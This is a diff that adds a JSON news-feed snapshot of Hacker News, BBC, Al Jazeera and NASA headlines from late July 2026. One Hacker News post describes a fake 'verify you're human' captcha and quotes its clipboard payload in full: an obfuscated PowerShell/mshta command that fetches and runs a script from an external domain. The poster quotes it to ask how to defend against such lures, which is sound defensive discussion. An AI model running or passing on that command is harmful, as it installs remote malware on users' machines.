@@ -1,0 +1,121 @@
+{
+    "update_time": "2026-07-28T18:57:35+03:30",
+    "timezone": "Asia/Tehran",
+    "total_news": 12,
+    "sources_used": [
+        "NASA",
+        "Hacker News",
+        "BBC",
+        "Al Jazeera"
+    ],
+    "news": [
+        {
+            "source": "Hacker News",
+            "category": "technology",
+            "title": "Ask HN: Crooked Timber showed showed me a virus captcha, What now?",
+            "description": "<p>Hello everyone,\nThis morning, as i started my shift, i thought i would start visiting some news blogs / websites to kick off the day. When it got to Crooked Timber i saw a captcha page instead, it looked like a traditional Google captcha.\nI clicked it, the spinner spun, and a box opened on the right, showing the traditional \"Verify you're human\" white title on a blue background.<p>It showed 2 \"Manual Verification Steps\" :\n1. Press Win + R\n2. Press Ctrl + V and press Run<p>At first i assumed it was a new type of captcha checking i a physical keyboard was attached to the browser. But i instantly recognized the attempt to make me run a script on my machine.<p>I opened a new type and to my surprise, the something new was in my clipboard : \n\"pcalua -a \"PowerShell\" -c \"saps cmd '/v/c m^s^h^t^a h^t^t^p^s^:^/^/fine-work-team.com/6272' -Wi Hi\"\"<p>I submited it to one of LLMs my work gives me access to, which told me to absolutly not run it (i wasn't planning to) and explained the command would download and run a script from the URL.<p>How do i protect myself from these scams / hack attempts in the future ? i always tought of myself \"prepared\" but i was surprised.<p>Has this happened to you before ? How do you protect yourself ?</p>\n<hr />\n<p>Comments URL: <a href=\"https://news.ycombinator.com/item?id=49084404\">https://news.ycombinator.com/item?id=49084404</a></p>\n<p>Points: 21</p>\n<p># Comments: 12</p>",
+            "url": "https://news.ycombinator.com/item?id=49084404",
+            "published": "Tue, 28 Jul 2026 14:25:36 +0000",
+            "fetched": "2026-07-28T18:57:35+03:30"
+        },
+        {
+            "source": "Hacker News",
+            "category": "technology",
+            "title": "VMs can't boot with Network Mode set to Bridged on Apple M5 Pro machines",
+            "description": "<p>Article URL: <a href=\"https://github.com/utmapp/UTM/issues/7658\">https://github.com/utmapp/UTM/issues/7658</a></p>\n<p>Comments URL: <a href=\"https://news.ycombinator.com/item?id=49083634\">https://news.ycombinator.com/item?id=49083634</a></p>\n<p>Points: 3</p>\n<p># Comments: 1</p>",
+            "url": "https://github.com/utmapp/UTM/issues/7658",
+            "published": "Tue, 28 Jul 2026 13:33:42 +0000",
+            "fetched": "2026-07-28T18:57:35+03:30"
+        },
+        {
+            "source": "Hacker News",
+            "category": "technology",
+            "title": "Show HN: tale.fyi, we deserve a home for fiction",
+            "description": "<p>for decades, i have been concerned that the internet was being built around non-fiction, so i built something to show how we could celebrate great fiction on the web.<p>i started with an amazing library from the public domain, and i also added tools to add your own stories<p>super interested to hear any feedback, and if you read anything good!</p>\n<hr />\n<p>Comments URL: <a href=\"https://news.ycombinator.com/item?id=49083389\">https://news.ycombinator.com/item?id=49083389</a></p>\n<p>Points: 47</p>\n<p># Comments: 31</p>",
+            "url": "https://tale.fyi/@sam/announcing-tale-fyi-read-or-listen-to-an-entire-book-from-a-single-link",
+            "published": "Tue, 28 Jul 2026 13:16:52 +0000",
+            "fetched": "2026-07-28T18:57:35+03:30"
+        },
+        {
+            "source": "BBC",
+            "category": "world",
+            "title": "French Navy carries out 'shooting drill' during MP's BBC interview",
+            "description": "Shadow Home Secretary Chris Philp says the vessel fired 17 shots as he was giving a BBC interview.",
+            "url": "https://www.bbc.co.uk/news/articles/cy4ker2y1mko?at_medium=RSS&at_campaign=rss",
+            "published": "Tue, 28 Jul 2026 13:53:26 GMT",
+            "fetched": "2026-07-28T18:57:35+03:30"
+        },
+        {
+            "source": "BBC",
+            "category": "world",
+            "title": "Powell says student loan system at top of in-tray",
+            "description": "She says she stands by past comments that the interest charged on Plan 2 loans is \"egregious\".",
+            "url": "https://www.bbc.co.uk/news/articles/ce8l064xe52o?at_medium=RSS&at_campaign=rss",
+            "published": "Tue, 28 Jul 2026 14:50:02 GMT",
+            "fetched": "2026-07-28T18:57:35+03:30"
+        },
+        {
+            "source": "BBC",
+            "category": "world",
+            "title": "Naga Munchetty to leave BBC Breakfast after 17 years",
+            "description": "The BBC One show's co-host will swap the TV sofa for the presenter's chair on Radio 5 Live Breakfast.",
+            "url": "https://www.bbc.co.uk/news/articles/cn0ngrpp2p5o?at_medium=RSS&at_campaign=rss",
+            "published": "Tue, 28 Jul 2026 11:38:26 GMT",
+            "fetched": "2026-07-28T18:57:35+03:30"
+        },
+        {
+            "source": "Al Jazeera",
+            "category": "world",
+            "title": "FIFA World Cup: For India, qualification is still just a distant dream",
+            "description": "India failed to qualify for next year&#039;s Asian Cup, making a FIFA World Cup 2030 or 2034 appearance unlikely.",
+            "url": "https://www.aljazeera.com/sports/2026/7/28/fifa-world-cup-for-india-football-qualification-is-still-just-a-distant-dream?traffic_source=rss",
+            "published": "Tue, 28 Jul 2026 14:45:14 +0000",
+            "fetched": "2026-07-28T18:57:35+03:30"
+        },
+        {
+            "source": "Al Jazeera",
+            "category": "world",
+            "title": "Iraqi PM visits Turkiye to boost ties despite complex challenges",
+            "description": "Discussions to focus on &#039;strategic cooperation&#039;, as well as issues related to security, water and the economy.",
+            "url": "https://www.aljazeera.com/economy/2026/7/28/iraqi-pm-visits-turkiye-to-boost-ties-despite-complex-challenges?traffic_source=rss",
+            "published": "Tue, 28 Jul 2026 13:55:52 +0000",
+            "fetched": "2026-07-28T18:57:35+03:30"
+        },
+        {
+            "source": "Al Jazeera",
+            "category": "world",
+            "title": "France and Spain brace for heatwave that could worsen raging wildfires",
+            "description": "Both countries expect to see temperatures soar into Wednesday, which could cause the blazes to spread.",
+            "url": "https://www.aljazeera.com/news/2026/7/28/france-and-spain-brace-for-heatwave-that-could-worsen-raging-wildfires?traffic_source=rss",
+            "published": "Tue, 28 Jul 2026 13:39:23 +0000",
+            "fetched": "2026-07-28T18:57:35+03:30"
+        },
+        {
+            "source": "NASA",
+            "category": "nature",
+            "title": "Wildfire Fairpoint, Meade, South Dakota",
+            "description": "Natural event: Wildfires",
+            "url": "https://eonet.gsfc.nasa.gov/api/v3/events/EONET_21829",
+            "published": "2026-07-27T11:21:00Z",
+            "fetched": "2026-07-28T18:57:35+03:30"
+        },
+        {
+            "source": "NASA",
+            "category": "nature",
+            "title": "Typhoon Dolphin",
+            "description": "Natural event: Severe Storms",
+            "url": "https://eonet.gsfc.nasa.gov/api/v3/events/EONET_21776",
+            "published": "2026-07-27T06:00:00Z",
+            "fetched": "2026-07-28T18:57:35+03:30"
+        },
+        {
+            "source": "NASA",
+            "category": "nature",
+            "title": "Wildfire Twin Butte Ck, Corson, South Dakota",
+            "description": "Natural event: Wildfires",
+            "url": "https://eonet.gsfc.nasa.gov/api/v3/events/EONET_21835",
+            "published": "2026-07-27T00:31:00Z",
+            "fetched": "2026-07-28T18:57:35+03:30"
+        }
+    ]
+}
